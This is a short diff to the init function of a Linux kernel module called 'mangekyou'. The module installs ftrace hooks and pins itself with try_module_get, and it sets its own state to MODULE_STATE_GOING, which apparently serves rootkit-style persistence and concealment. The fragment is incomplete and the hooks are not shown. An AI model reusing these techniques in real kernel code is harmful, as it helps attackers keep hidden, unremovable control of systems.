@@ -97,17 +97,16 @@ static struct ftrace_hook hooks[] = {
 
 static int __init mangekyou_init(void){
         int error; 
-        bool isalive;
         error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
         if(error){
                 return error;
         }
-        isalive = module_is_live(THIS_MODULE);
-        if ( isalive ){
-                THIS_MODULE->state=MODULE_STATE_GOING;
+        if ( try_module_get(THIS_MODULE) ){
         }
-        /*pr_alert("Module exit functions state:%d",THIS_MODULE->state);*/
-        return 0;
+        else {
+                THIS_MODULE->state=MODULE_STATE_GOING;
+        }        
+                return 0;
 }
 
 static void __exit mangekyou_exit(void){
